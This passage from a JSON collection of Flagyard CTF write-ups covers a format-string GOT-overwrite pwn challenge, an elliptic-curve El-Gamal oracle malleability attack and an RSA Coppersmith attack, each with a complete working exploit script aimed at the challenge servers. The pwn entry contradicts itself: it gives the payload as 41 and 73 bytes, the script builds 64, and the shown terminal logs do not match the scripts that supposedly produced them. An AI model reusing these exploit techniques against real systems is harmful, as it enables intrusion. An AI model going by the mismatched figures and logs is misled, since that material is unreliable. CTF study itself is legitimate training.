      "content": "Run checksec to identify security mitigations. The key findings:\n\n- **Partial RELRO** ← GOT is writable (THE VULNERABILITY!)\n- **No Stack Canary** ← Stack layout is predictable\n- **No PIE** ← Static addresses throughout\n- **Intel CET (IBT/SHSTK)** ← CPU-level protection on indirect branches\n\nPartial RELRO is our golden ticket - it means GOT can be hijacked. The absence of PIE makes finding addresses trivial. Intel CET requires landing at endbr64 instruction, but that's exactly where win() starts."
    },
    {
      "title": "Phase 2: Static Analysis via Reverse Engineering",
      "content": "Reverse engineer with radare2/objdump to find:\n\n**TARGET: win() @ 0x4011b6**\n- Starts with endbr64 (Intel CET safe)\n- Calls system(\"/bin/cat flag\")\n- Prize: FLAG output\n\n**VULNERABILITY: get_secret()**\n- fgets(buffer, 128) reads user input\n- mov rdi, buffer (puts input in RDI)\n- call printf(NO FORMAT SPEC!) ← THE BUG!\n- call puts via GOT\n\n**TARGET: GOT[puts] @ 0x404018**\n- Currently points to libc's puts\n- We'll redirect to win() @ 0x4011b6\n- Writable because Partial RELRO!"
    },
    {
      "title": "Phase 3: Format String Offset Discovery",
      "content": "Test with patterns to find where user input becomes accessible to printf. Input AAAAAAAA (0x4141414141414141 in hex) and test with format string specifiers to identify the stack offset. The result shows %6$p returns our input in hex, confirming user input is at offset 6 on the printf stack.\n\nOnce we know the offset is 6, we can plan our payload: by padding with dummy bytes and embedding pointers, those pointers will occupy stack positions 11, 12, and 13. This allows us to use %11$hn, %12$hn, %13$hn to write arbitrary 2-byte values to the addresses stored in those positions (the GOT entries we target).",
      "code": "Offset discovery method:\n\nPayload: AAAAAAAA\nTest: %1$p, %2$p, %3$p, %4$p, %5$p, %6$p\n\nResult: %6$p returns 0x4141414141414141\n→ User input at OFFSET 6!\n\nStack Layout:\nOffset 0-5:   Function pointers, saved values\nOffset 6:     [USER INPUT STRING START]\nOffset 11:    [p64(GOT+2)] ← %11$hn writes here\nOffset 12:    [p64(GOT+0)] ← %12$hn writes here\nOffset 13:    [p64(GOT+4)] ← %13$hn writes here"
    },
    {
      "title": "Phase 4: GOT Overwrite Strategy",
      "content": "The target address 0x4011b6 (win function) must be written into GOT[puts] at 0x404018. Since we can only write 2-byte values with %hn, break the address into three 2-byte chunks and write each separately using the three pointers at offsets 11, 12, 13.\n\nThe key is calculating the byte counts for printf to output. We write from smallest to largest value—this minimizes the total padding needed in the format string. Each %hn operation writes the number of bytes printf has already output (modulo 65536).\n\nThe resulting format string is compact at just 41 bytes, well under the 128-byte limit. The three pointer addresses are appended after padding to make them accessible via the stack offsets we discovered.",
      "code": "Address breakdown:\n0x4011b6 = [0x11b6] [0x0040] [0x0000]\n          (lower) (middle)  (upper)\n\nWrite sequence (smallest to largest):  \n1. %11$hn writes 0x0040 (byte count: 64) → GOT+2\n2. %12$hn writes 0x11b6 (byte count: 4534) → GOT+0\n3. %13$hn writes 0x0000 (byte count: 65536 wraps to 0) → GOT+4\n\nFormat string:  \n%64c              Output 64 bytes  \n%11$hn            Write 0x0040 @ offset 11  \n%4470c            Output 4470 MORE (total 4534)  \n%12$hn            Write 0x11b6 @ offset 12  \n%61002c           Output 61002 MORE (total 65536)  \n%13$hn            Write 0x0000 @ offset 13  \n\nTotal format string: 41 bytes✓"
    },
    {
      "title": "Phase 5: Payload Assembly",
      "content": "Assemble the complete 73-byte payload by combining the format string, padding, and GOT address pointers. The format string is 41 bytes and provides the directives for the three %hn writes. Pad with dummy bytes (we use 'A's) to reach exactly 40 bytes of total content before the pointers. This ensures proper alignment for the stack layout.\n\nAfter padding, append three 8-byte pointers: the first pointer for GOT+2, second for GOT+0, third for GOT+4. These pointers are embedded in the payload itself, and the padding ensures they occupy offsets 11, 12, and 13 when printf reads from the stack.",
      "code": "Final Payload Structure:\n\n[Section 1] Format String (41 bytes)\n%64c%11$hn%4470c%12$hn%61002c%13$hn\n\n[Section 2] Padding (pad to 40 byte alignment)\nAAAAAAAAAAAAAAAAAAAAAAAAA...\n\n[Section 3] Pointers (24 bytes total)\np64(0x40401a)  GOT+2, will be at offset 11\np64(0x404018)  GOT+0, will be at offset 12\np64(0x40401c)  GOT+4, will be at offset 13\n\n=== TOTAL: 73 bytes ==="
    },
    {
      "title": "Phase 6: Exploitation & Flag Extraction",
      "content": "Send the crafted 73-byte payload through the vulnerable printf input. The binary processes the format string, executing each %hn write operation in sequence. Each write operation dereferences the pointer at the specified offset on the stack and writes the calculated byte count to that address.\n\nAs execution progresses through the format string, the byte counter accumulates: first 64 bytes for the first write, then 4470 more to reach 4534 for the second write, then 61002 more to reach 65536 (which wraps to 0) for the third write. After printf completes and returns, the binary continues execution and calls puts via GOT. Since we've hijacked GOT[puts] to point to win() at 0x4011b6 (which starts with endbr64 for Intel CET compatibility), the program jumps into win(). The win function calls system(\"/bin/cat flag\") and outputs the flag.",
      "code": "Execution Flow:\n\n[1] printf() processes format string\n    %64c outputs 64 bytes\n    %11$hn dereferences [offset 11], WRITE 0x0040 to GOT+2\n\n[2] Continue format string processing\n    %4470c outputs 4470 MORE bytes (total now 4534)\n    %12$hn dereferences [offset 12], WRITE 0x11b6 to GOT+0\n\n[3] Final format directive\n    %61002c outputs 61002 MORE bytes (total 65536, wraps to 0)\n    %13$hn dereferences [offset 13], WRITE 0x0000 to GOT+4\n\n[4] After printf returns\n    Binary calls: puts() via GOT\n    GOT[0x404018] now contains 0x4011b6 (HIJACKED!)\n    CPU jumps to 0x4011b6 (endbr64 instruction present)\n\n[5] win() function executes\n    Calls system(\"/bin/cat flag\")\n    FLAG PRINTED! 🏁"
    },
    {
      "title": "Phase 7: Final Exploit Script",
      "content": "Put everything together in a single Python script using pwntools. The script connects to the remote server, crafts the format string payload with the correct byte count calculations, pads it to align the GOT pointers at the correct stack offsets, and sends the complete 73-byte payload to trigger the exploitation chain.",
      "code": "from pwn import *\n\n# Setup\np = remote('tcp.flagyard.com', 28339)\n\n# Target addresses\ntarget_got = 0x404018      # GOT[puts]\nwin_addr = 0x4011b6         # win() function\n\n# Break down address into 2-byte chunks\n# 0x4011b6 = [0x11b6] [0x0040] [0x0000]\n\nval1 = 64       # First write: 0x0040\nval2 = 4534     # Second write: 0x11b6\nval3 = 65536    # Third write: 0x0000 (wraps)\n\n# Build format string with cumulative byte counts\nfmt = f\"%{val1}c%11$hn\"\nfmt += f\"%{val2 - val1}c%12$hn\"\nfmt += f\"%{val3 - val2}c%13$hn\"\nfmt = fmt.encode()\n\n# Assemble payload\n# [Format String (41 bytes)] + [Padding to 40 bytes] + [3 pointers (24 bytes)]\npayload = fmt.ljust(40, b\"A\")           # Pad to 40 bytes\npayload += p64(target_got + 2)          # Pointer to GOT+2 @ offset 11\npayload += p64(target_got + 0)          # Pointer to GOT+0 @ offset 12\npayload += p64(target_got + 4)          # Pointer to GOT+4 @ offset 13\n\nlog.info(f\"Sending payload ({len(payload)} bytes)...\")\np.sendlineafter(b\"something: \", payload)\n\n# Wait for printf to finish and read output\np.recv(timeout=1)\nlog.success(\"Exploit success! Extracting flag...\\n\")\n\nprint(\"=\"*30)\nprint(p.clean(timeout=1).decode(errors='ignore').strip())\nprint(\"=\"*30)\n\np.interactive()"
    }
  ],
  "terminalOutputs": [
    {
      "command": "checksec ./got_me",
      "output": "[*] '/home/nata/ctf/flagyard/pwn/2/got_me'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled"
    },
    {
      "command": "python3 -c 'print(\"AAAAAAAA %6$p\")'  | ./got_me",
      "output": "AAAAAAAA 0x4141414141414141"
    },
    {
      "command": "objdump -R got_me | grep puts",
      "output": "0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5"
    },
    {
      "command": "python3 solve.py",
      "output": "[+] Opening connection to tcp.flagyard.com on port 28339: Done\n[*] Targeting GOT puts: 0x404018\n[*] Payload Length: 64 bytes (Safe < 128)\n[*] Exploit success! Flag incoming...\n\n==============================\nFlagY{58048b5df459c83d2f498e5c060453d3}\n=============================="
    }
  ],
  "flag": "FlagY{58048b5df459c83d2f498e5c060453d3}",
  "lessonsLearned": "**Format String Exploitation Precision** - Format string attacks require careful offset calculation and understanding of stack layout. Each write operation must be crafted to align with target memory locations and respect size constraints (128-byte limit in this case).\n\n**Partial RELRO Weakness** - Partial RELRO makes the GOT writable during program execution. This enables GOT hijacking, a powerful technique for redirecting control flow. Always prefer Full RELRO when possible to prevent such attacks.\n\n**Intel CET Awareness** - Modern CPU protections like Intel CET (SHSTK and IBT) require exploit developers to respect instruction boundaries. Landing at the correct function entry point (endbr64) is mandatory; jumping mid-function will cause immediate termination.\n\n**Multi-Stage Writes** - When dealing with size constraints, breaking large overwrites into multiple smaller writes (%hn for 2-byte writes) allows fitting exploits within payload limits while still achieving arbitrary writes.\n\n**Static Addresses for Exploitation** - Absence of PIE made this exploit straightforward. With PIE enabled, information disclosure (format string leak) would be needed first to locate win() before overwriting GOT.\n\n**Payload Alignment** - Careful padding and alignment of pointers in payload is essential. The format string and GOT pointers must be positioned precisely at the correct offsets for %11$hn, %12$hn, %13$hn to reference them correctly.\n\n**Defense in Depth Failure** - While Intel CET provides good protection against arbitrary control flow, it must work alongside other mitigations. No stack canary + Partial RELRO + static addresses = exploitable despite modern protections. Multiple complementary security layers are necessary."
},
{
  "id": "14",
  "title": "Normal El-Gamal (Elliptic Curve)",
  "category": "Crypto",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-26",
  "author": "CTF Team",
  "ctfName": "Flagyard CTF",
  "description": "Elliptic Curve El-Gamal implementation with hidden parameters and decryption filter. Exploit parameter recovery via oracle encryption and ciphertext malleability attack to bypass security checks.",
  "problemDescription": "An Oracle service (running at tcp.flagyard.com:30910) provides encryption and decryption menus for El-Gamal cryptography on Elliptic Curves (ECC). A target ciphertext representing a flag is given at connection startup. The challenge involves two main obstacles: (1) All curve parameters (a, b, p) are hidden, and (2) A strict filter prevents direct decryption of the flag ciphertext by checking that the decryption result matches the original plaintext flag.",
  "tools": [
    "pwntools",
    "Python",
    "Elliptic Curve Math",
    "Number Theory (GCD)",
    "Ciphertext Malleability"
  ],
  "analysis": "The vulnerability chain relies on two critical weaknesses in the implementation.\n\n**1. Parameter Recovery via Oracle Encryption**\n\nThe server provides an encryption oracle that accepts arbitrary plaintexts. By encrypting known values and collecting the resulting elliptic curve points, we reconstruct curve parameters using algebraic relationships.\n\nFor a point (x, y) on the curve y² ≡ x³ + ax + b (mod p), we define:\nv_i = y_i² - x_i³ ≡ ax_i + b (mod p)\n\nUsing multiple points, we eliminate unknowns and compute differences. The modulus p is recovered via GCD of these differences. Once p is known, a and b follow through linear equation solving.\n\n**2. Ciphertext Malleability Attack**\n\nElliptic Curve El-Gamal encrypts as: C₁ = kG and C₂ = kA + M, where k is random, G is the generator, A = xG is the public key, and x is the private key.\n\nThe scheme lacks integrity protection. By adding a known point P_pad to C₂, we create: C₂' = C₂ + P_pad\n\nWhen the server decrypts (C₁, C₂'), it computes:\nM' = C₂' - xC₁ = (kA + M + P_pad) - kA = M + P_pad\n\nSince M' ≠ M_flag, the server's filter is bypassed. We recover the original message locally:\nM = M' - P_pad",
  "mathAnalysis": [
    {
      "title": "Elliptic Curve Point Addition",
      "formula": "\\text{On } y^2 = x^3 + ax + b \\pmod{p} :\\\\n \\\\n m = \\begin{cases} \\frac{3x_1^2 + a}{2y_1} \\pmod{p} & \\text{if } P = Q \\\\\\\\ \\frac{y_2 - y_1}{x_2 - x_1} \\pmod{p} & \\text{if } P \\neq Q \\end{cases}\\\\n \\\\n x_3 = m^2 - x_1 - x_2 \\pmod{p} \\quad y_3 = m(x_1 - x_3) - y_1 \\pmod{p}",
      "description": "Core EC arithmetic used in both encryption and decryption"
    },
    {
      "title": "Parameter Recovery via GCD",
      "formula": "\\text{Given points } (x_1, y_1), (x_2, y_2), (x_3, y_3) \\text{ on curve } y^2 = x^3 + ax + b \\pmod{p}:\\\\n \\\\n v_i = y_i^2 - x_i^3\\\\n \\\\n k = (v_1 - v_2)(x_2 - x_3) - (v_2 - v_3)(x_1 - x_2)\\\\n \\\\n p = \\gcd(k_1, k_2, \\ldots, k_n)",
      "description": "Algebraic technique to recover the modulus $p$"
    },
    {
      "title": "El-Gamal Decryption Formula",
      "formula": "\\text{Given ciphertext } (C_1, C_2) \\text{ and private key } x:\\\\n \\\\n M = C_2 - xC_1",
      "description": "Where $x$ is the private key (scalar), multiplication is point doubling/addition"
    },
    {
      "title": "Malleability Relation",
      "formula": "\\text{Original: } M = C_2 - xC_1\\\\n \\\\n \\text{Modified: } M' = (C_2 + P_{\\text{pad}}) - xC_1 = M + P_{\\text{pad}}\\\\n \\\\n \\text{Recovery: } M = M' - P_{\\text{pad}}",
      "description": "Demonstrates how adding a known point to ciphertext shifts plaintext additively"
    }
  ],
  "solution": [
    {
      "title": "Step 1: Receive Target Ciphertext",
      "content": "Connect to the online oracle and extract the flag ciphertext from the initial response. Parse the coordinates $(C_{1x}, C_{1y}, C_{2x}, C_{2y})$ which represent two points on the hidden curve."
    },
    {
      "title": "Step 2: Collect Curve Points from Encryption Oracle",
      "content": "Use the encryption menu (option 1) to encrypt small integers (1, 2, 3, ...). Each encryption returns a ciphertext $(C_1, C_2)$ consisting of two valid curve points. Collect at least 5 unique points with distinct x-coordinates to ensure reliable parameter recovery."
    },
    {
      "title": "Step 3: Reconstruct Curve Equation",
      "content": "For each collected point $(x, y)$, compute $v = y^2 - x^3$. Using three consecutive points, form the equation $k = (v_1 - v_2)(x_2 - x_3) - (v_2 - v_3)(x_1 - x_2)$ and collect multiple $k$ values. Take the GCD of all $k$ values to recover the modulus $p$.",
      "code": "# From collected points, recover modulus\nvs = [y**2 - x**3 for x, y in unique_points]\nKs = []\n\nfor i in range(len(unique_points) - 2):\n    v1, v2, v3 = vs[i], vs[i+1], vs[i+2]\n    x1, x2, x3 = unique_points[i][0], unique_points[i+1][0], unique_points[i+2][0]\n    k = (v1 - v2)*(x2 - x3) - (v2 - v3)*(x1 - x2)\n    Ks.append(abs(k))\n\np = Ks[0]\nfor k in Ks[1:]:\n    p = math.gcd(p, k)"
    },
    {
      "title": "Step 4: Recover Curve Parameters a and b",
      "content": "Using any two distinct points $(x_1, y_1)$ and $(x_2, y_2)$ along with the recovered modulus $p$, solve for $a$ and $b$ using linear equations derived from the curve equation.",
      "code": "# Recover a and b using linear system\nx1, y1 = unique_points[0]\nx2, y2 = unique_points[1]\nv1, v2 = vs[0], vs[1]\n\n# From v1 = ax1 + b and v2 = ax2 + b\na = (v1 - v2) * pow(x1 - x2, -1, p) % p\nb = (v1 - a * x1) % p"
    },
    {
      "title": "Step 5: Craft Malleability Payload",
      "content": "Select a known curve point $P_{pad}$ from ones we collected (e.g., unique_points[2]). Add this point to $C_2$ of the target ciphertext using elliptic curve addition to create $C_2' = C_2 + P_{pad}$.",
      "code": "def ec_add(P, Q, a, p):\n    if P == (0, 0): return Q\n    if Q == (0, 0): return P\n    x1, y1 = P\n    x2, y2 = Q\n    if x1 == x2:\n        return (0, 0) if y1 != y2 else ec_double(P, a, p)\n    \n    m = (y2 - y1) * pow(x2 - x1, -1, p) % p\n    x3 = (m**2 - x1 - x2) % p\n    y3 = (m * (x1 - x3) - y1) % p\n    return (x3, y3)\n\n# Craft modified ciphertext\nP_pad = unique_points[2]\nC2_prime = ec_add(C2_target, P_pad, a, p)"
    },
    {
      "title": "Step 6: Bypass Decryption Filter",
      "content": "Send the modified ciphertext $(C_1, C_2')$ to the decryption oracle. Since $M' \\neq$ target flag $M$, the server's equality check is bypassed and it decrypts successfully, returning the modified plaintext $M'$."
    },
    {
      "title": "Step 7: Recover Original Plaintext",
      "content": "Subtract the padding point locally: $M = M' - P_{pad}$ using elliptic curve subtraction. Convert the resulting point's x-coordinate to the integer flag by removing the byte-length encoding prefix applied by the server.",
      "code": "def ec_sub(P, Q, a, p):\n    x, y = Q\n    return ec_add(P, (x, (-y) % p), a, p)\n\n# Recover original message\nM_target = ec_sub(M_prime, P_pad, a, p)\n\n# Convert point to flag integer\nflag_int = M_target[0] >> 8  # Remove length prefix\nflag = long_to_bytes(flag_int)\nprint(f\"FLAG: {flag.decode()}\")"
    },
    {
      "title": "Complete Exploit Script",
      "content": "Full working Python script that orchestrates parameter recovery, malleability attack, and flag extraction.",
      "code": "from pwn import *\nimport math\nfrom Crypto.Util.number import long_to_bytes\n\ndef inverse(n, p):\n    return pow(n, -1, p)\n\ndef ec_add(P, Q, a, p):\n    if P == (0, 0): return Q\n    if Q == (0, 0): return P\n    x1, y1 = P\n    x2, y2 = Q\n    if x1 == x2 and y1 != y2:\n        return (0, 0)\n    \n    if P == Q:\n        m = (3 * x1**2 + a) * inverse(2 * y1, p) % p\n    else:\n        m = (y2 - y1) * inverse(x2 - x1, p) % p\n        \n    x3 = (m**2 - x1 - x2) % p\n    y3 = (m * (x1 - x3) - y1) % p\n    return (x3, y3)\n\ndef ec_sub(P, Q, a, p):\n    x, y = Q\n    return ec_add(P, (x, -y % p), a, p)\n\ndef main():\n    host = 'tcp.flagyard.com'\n    port = 30910\n    \n    r = remote(host, port)\n    r.recvuntil(b\"ct=(\")\n    ct_data = r.recvuntil(b\")\")[:-1].decode()\n    c1x, c1y, c2x, c2y = [int(x) for x in ct_data.split(', ')]\n    C1_target = (c1x, c1y)\n    C2_target = (c2x, c2y)\n    log.info(\"Target CT received.\")\n\n    points = [(c1x, c1y), (c2x, c2y)]\n\n    log.info(\"Collecting points from oracle...\")\n    for i in range(1, 6):\n        r.recvuntil(b\">>\")\n        r.sendline(b\"1\")\n        r.recvuntil(b\"plaintext>> \")\n        r.sendline(str(i).encode())\n        \n        line = r.recvline().decode().strip()\n        if line.startswith('('):\n            pts = [int(x) for x in line[1:-1].split(', ')]\n            points.append((pts[0], pts[1]))\n            points.append((pts[2], pts[3]))\n\n    unique_points = []\n    seen_x = set()\n    for pt in points:\n        if pt[0] not in seen_x:\n            unique_points.append(pt)\n            seen_x.add(pt[0])\n            \n    vs = [y**2 - x**3 for x, y in unique_points]\n    Ks = []\n    \n    for i in range(len(unique_points) - 2):\n        v1, v2, v3 = vs[i], vs[i+1], vs[i+2]\n        x1, x2, x3 = unique_points[i][0], unique_points[i+1][0], unique_points[i+2][0]\n        k = (v1 - v2)*(x2 - x3) - (v2 - v3)*(x1 - x2)\n        Ks.append(abs(k))\n\n    p = Ks[0]\n    for k in Ks[1:]:\n        p = math.gcd(p, k)\n\n    for i in range(2, 5000):\n        while p % i == 0 and p > i:\n            p //= i\n\n    log.success(f\"Recovered Modulus (p): {p}\")\n\n    x1, y1 = unique_points[0]\n    x2, y2 = unique_points[1]\n    v1, v2 = vs[0], vs[1]\n\n    a = (v1 - v2) * inverse(x1 - x2, p) % p\n    b = (v1 - a * x1) % p\n    log.success(f\"Recovered parameter a: {a}\")\n    log.success(f\"Recovered parameter b: {b}\")\n\n    P_pad = unique_points[2] \n    C2_prime = ec_add(C2_target, P_pad, a, p)\n\n    log.info(\"Sending bypass payload to Decryption Oracle...\")\n    r.recvuntil(b\">>\")\n    r.sendline(b\"2\")\n    r.recvuntil(b\"ciphertext>> \")\n    payload = f\"{C1_target[0]},{C1_target[1]},{C2_prime[0]},{C2_prime[1]}\"\n    r.sendline(payload.encode())\n\n    res = r.recvline().decode().strip()\n    if \"m=\" in res:\n        parts = res.split(\"m=\")[1].split()\n        M_prime_x = int(parts[0])\n        M_prime_y = int(parts[1])\n        M_prime = (M_prime_x, M_prime_y)\n\n        M_target = ec_sub(M_prime, P_pad, a, p)\n        flag_int = M_target[0] >> 8\n        flag = long_to_bytes(flag_int)\n        \n        print(\"\\n\" + \"=\"*60)\n        print(f\"[+] FLAG: {flag.decode(errors='ignore')}\")\n        print(\"=\"*60 + \"\\n\")\n\n    r.close()\n\nif __name__ == \"__main__\":\n    main()"
    }
  ],
  "flag": "FlagY{717ad4d6a4d37fee8b2e6ebdfaf1d1f5}",
  "lessonsLearned": "**Hidden Parameter Assumption ≠ Security** - Concealing cryptographic parameters from the user does not strengthen the system if an encryption oracle is available. Parameters can be recovered through algebraic manipulation of plaintext-ciphertext pairs.\n\n**Integrity vs Confidentiality** - El-Gamal provides confidentiality but lacks built-in integrity guarantees. Without authenticated encryption (MAC/digital signature), ciphertexts remain malleable and can be transformed in predictable ways.\n\n**Oracle Access is Dangerous** - Encryption oracles that accept arbitrary plaintexts are high-risk. Carefully restrict oracle functionality to prevent parameter leakage and plaintext recovery attacks.\n\n**Filter Bypass via Transformation** - Security checks based on input-output equality can often be bypassed through homomorphic or malleable properties. Ensure checks operate on cryptographically authenticated values, not raw plaintexts.\n\n**Elliptic Curve Algebra** - Understanding point addition and scalar multiplication operations is crucial for ECC security analysis. Malleability often arises from the group structure itself.\n\n**Defense Strategy** - Use authenticated encryption schemes (ECIES with HMAC or similar), implement proper input validation, never rely on parameter obscurity, and prefer standardized cryptographic parameters with known security properties."
},
{
  "id": "15",
  "title": "CU29",
  "category": "Crypto",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-26",
  "author": "CTF Team",
  "ctfName": "Flagyard CTF",
  "description": "RSA challenge exploiting partial bit leakage of p+q combined with Coppersmith attack. Additional trap parameters including non-coprime exponent and fake small d value redirect inexperienced players. The name 'CU29' hints at Copper (Coppersmith).",
  "problemDescription": "Given standard RSA parameters (modulus n, public exponent e=23) along with a ciphertext c. The server leaks pq = (p+q) >> 200, providing the 313 most significant bits (MSBs) of the sum p+q. Additionally, a parameter ee (claimed to be the inversion of a small random d) is provided as a distraction. The challenge requires recovering the two prime factors p and q, then decrypting the message despite e being non-coprime with φ(n).",
  "tools": [
    "SageMath",
    "gmpy2",
    "Coppersmith Attack",
    "Polynomial Root Finding",
    "Chinese Remainder Theorem"
  ],
  "analysis": "The challenge exploits four related vulnerabilities:\n\n**1. Partial Bit Leakage:** The server leaks 313 bits (MSBs) of p+q by right-shifting 200 bits. This provides a strong initial approximation p_approx of the actual prime factor p. The missing 200 bits can be recovered using Coppersmith's method since they represent a 'small' unknown value relative to p.\n\n**2. Coppersmith Attack on Modular Polynomial:** Given p ≈ p_approx with error x₀ < 2^200, we construct f(x) = x + p_approx. Since f(x₀) ≡ 0 (mod p), and x₀ is small, Coppersmith's algorithm efficiently finds x₀. Once recovered, exact factorization follows: p = p_approx + x₀ and q = n/p.\n\n**3. Trap Parameter ee:** The small d value and its inversion ee are red herrings designed to mislead toward Boneh-Durfee or Wiener attacks. However, the bit leakage of p+q is sufficient for direct factorization, making these advanced attacks unnecessary.\n\n**4. Non-Coprime RSA and CRT:** Since e = 23 and gcd(e, φ(n)) > 1, standard RSA decryption d ≡ e^(-1) (mod φ(n)) fails. Instead, decrypt separately modulo p and q, finding all e-th roots via field operations, then combine all candidate pairs via Chinese Remainder Theorem to recover the plaintext.",
  "mathAnalysis": [
    {
      "title": "RSA Factors from Sum Approximation",
      "formula": "x^2 - Sx + n = 0 \\text{ where } S = p + q\\quad p, q = \\frac{S \\pm \\sqrt{S^2 - 4n}}{2}\\quad \\tilde{p} = \\frac{S_{\\text{approx}} + \\sqrt{S_{\\text{approx}}^2 - 4n}}{2}",
      "description": "Initial approximation of p using MSBs of p+q"
    },
    {
      "title": "Coppersmith Polynomial",
      "formula": "f(x) = x + \\tilde{p} \\text{ where } |e_0| < 2^{200}\\quad f(e_0) \\equiv 0 \\pmod{p}\\quad |e_0| < N^{\\beta^2/d} \\text{ with } \\beta = 0.5, d = 1",
      "description": "Recover lost LSBs using SageMath small_roots()"
    },
    {
      "title": "Non-Coprime Decryption with CRT",
      "formula": "\\gcd(e, \\phi(n)) \\neq 1 \\text{ decrypt separately}\\quad m_p^e \\equiv c \\pmod{p}\\quad m_q^e \\equiv c \\pmod{q}\\quad m \\equiv m_p \\cdot q \\cdot (q^{-1} \\bmod p) + m_q \\cdot p \\cdot (p^{-1} \\bmod q) \\pmod{n}",
      "description": "Recover plaintext from multiple candidate roots using Chinese Remainder Theorem"
    },
    {
      "title": "e-th Root Computation in Modular Fields",
      "formula": "m^e \\equiv c_p \\pmod{p} \\Rightarrow m \\equiv c_p^{1/e} \\pmod{p}\\quad \\text{All } e\\text{-th roots via SageMath } \\texttt{nth\\_root(e, all=True)}",
      "description": "Find all modular e-th roots for CRT combination"
    }
  ],
  "solution": [
    {
      "title": "Step 1: Reconstruct p+q Approximate Value",
      "content": "The leaked pq value represents (p+q) >> 200. Restore the approximate sum by left-shifting 200 bits: S_approx = pq_val << 200"
    },
    {
      "title": "Step 2: Compute Initial p Approximation",
      "content": "Using the quadratic formula, compute: D = S_approx² - 4n, then Δ = √D. The initial approximation is: p_approx = (S_approx + Δ) / 2"
    },
    {
      "title": "Step 3: Apply Coppersmith's Algorithm",
      "content": "Create polynomial f(x) = x + p_approx in the ring Z_n[x]. Call SageMath's small_roots() to find the LSBs error x₀. The bound X = 2^205 accounts for ~200 missing bits plus tolerance.",
      "code": "PR.<x> = PolynomialRing(Zmod(n))\nf = x + p_approx\nroots = f.small_roots(X=2^205, beta=0.5, epsilon=0.03)\np_diff = int(roots[0])\np = p_approx + p_diff\nq = n // p"
    },
    {
      "title": "Step 4: Compute e-th Roots Modulo p and q",
      "content": "Since gcd(e, φ(n)) > 1, decrypt separately modulo each prime. Find all e-th roots of c modulo p and q using nth_root() method which returns all solutions.",
      "code": "P_ring = Zmod(p)\nQ_ring = Zmod(q)\ncp = P_ring(c)\ncq = Q_ring(c)\nmp_roots = cp.nth_root(e, all=True)\nmq_roots = cq.nth_root(e, all=True)"
    },
    {
      "title": "Step 5: Combine Roots Via CRT",
      "content": "For each pair (m_p, m_q) from the Cartesian product of root sets, use the Chinese Remainder Theorem to recover candidate plaintexts m. Check which candidate contains the flag marker 'FlagY{'.",
      "code": "for mp in mp_roots:\n    for mq in mq_roots:\n        m = crt([int(mp), int(mq)], [p, q])\n        flag_candidate = long_to_bytes(int(m))\n        if b\"FlagY{\" in flag_candidate:\n            print(flag_candidate.decode())"
    },
    {
      "title": "Complete Exploit Script (SageMath)",
      "content": "Full working script using SageMath for Coppersmith attack and CRT-based decryption with multiple root candidates.",
      "code": "import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\nn = 74400198359942513862730376031146135802606791991588575465056163121555925617314946580878695576381159966669035646513358312316295727962048929334491638793366454990554957760082895721209907599102882541383389817613899931138405942694622063421798336056156478661669460226638891433547765658851966477956365621503055329677\ne = 23\nc = 67093879684168042482911544476248580360412038370701084199780323275036434279521774982225923057805337317989111708384627608827582845935869416467560399759225810925388294903783674263633367996837459206550597542374370661621276546154790021615738055122556152562693170717804941676044793478893041430142032267013836633841\npq_val = 10742021914074381086319674056236928469987565979831767505178443989041183736389136816846636592297\n\nprint(\"[*] Stage 1: Building p approximation from MSB...\")\nS_approx = pq_val << 200\nD = S_approx**2 - 4*n\nisqrt_D = int(gmpy2.isqrt(int(D)))\np_approx = (S_approx + isqrt_D) // 2\n\nprint(\"[*] Stage 2: Running Coppersmith small_roots...\")\nPR.<x> = PolynomialRing(Zmod(n))\nf = x + p_approx\nroots = f.small_roots(X=2^205, beta=0.5, epsilon=0.03)\n\np_diff = int(roots[0])\np = int(p_approx + p_diff)\nq = n // p\nassert p * q == n\nprint(\"[+] Factorization Success!\")\n\nprint(\"\\n[*] Stage 3: Decryption with CRT (non-coprime e=23)...\")\nP_ring = Zmod(p)\nQ_ring = Zmod(q)\ncp = P_ring(c)\ncq = Q_ring(c)\nmp_roots = cp.nth_root(e, all=True)\nmq_roots = cq.nth_root(e, all=True)\n\nprint(f\"[*] Found {len(mp_roots)} roots mod p and {len(mq_roots)} roots mod q\")\nprint(\"[*] Testing CRT combinations...\")\n\nfor mp in mp_roots:\n    for mq in mq_roots:\n        m = crt([int(mp), int(mq)], [p, q])\n        flag_candidate = long_to_bytes(int(m))\n        if b\"FlagY{\" in flag_candidate:\n            print(\"\\n\" + \"=\"*60)\n            print(f\"[+] FLAG: {flag_candidate.decode(errors='ignore')}\")\n            print(\"=\"*60 + \"\\n\")"
    }
  ],
  "terminalOutputs": [
    {
      "command": "sage solve.sage",
      "output": "[*] Tahap 1: Membangun aproksimasi p dari MSB (p+q)...\n[*] Tahap 2: Menjalankan Coppersmith small_roots...\n[+] Factoring Berhasil!\n\n[*] Tahap 3: Dekripsi CRT dengan eksponen e=23...\n[*] Menguji semua kombinasi CRT untuk mencari flag...\n\n============================================================\n[+] FLAG: FlagY{1_b17_7h15_w45_fun_n0nc0pr1m3_4nd_c0pp3r5m17h_mul71v4r1473_4774ck}\n============================================================"
    }
  ],
  "flag": "FlagY{1_b17_7h15_w45_fun_n0nc0pr1m3_4nd_c0pp3r5m17h_mul71v4r1473_4774ck}",
  "lessonsLearned": "**Partial Bit Leakage is Critical** - Leaking even the MSBs of sensitive values like p+q creates exploitable approximations. Combined with Coppersmith's algorithm, 200 missing bits can be recovered efficiently. Always protect prime sums and related values.\n\n**Coppersmith's Theorem is Powerful** - When you have an approximation within 2^(1/d) relative error, polynomial root finding in modular arithmetic recovers the exact value. This breaks RSA with partial p or q leakage.\n\n**Non-Coprime Exponents Break RSA** - The standard decryption formula d ≡ e^(-1) (mod φ(n)) fails when gcd(e, φ(n)) ≠ 1. Secure RSA requires e to be coprime with φ(n). Use safe primes or validate this condition.\n\n**Red Herrings in CTF** - Parameters like small d and ee were designed to distract from the real vulnerability (bit leakage). Focus on information that servers shouldn't leak rather than chasing advanced attacks when simpler ones work.\n\n**CRT for Multiple Candidates** - When decryption yields multiple valid plaintexts (due to non-coprimality), CRT efficiently combines n candidates into n checks. Brute-forcing with a recognizable marker (like 'FlagY{') quickly identifies the correct plaintext.\n\n**Defense Strategy** - Never leak (p+q) >> k for any small k. Use 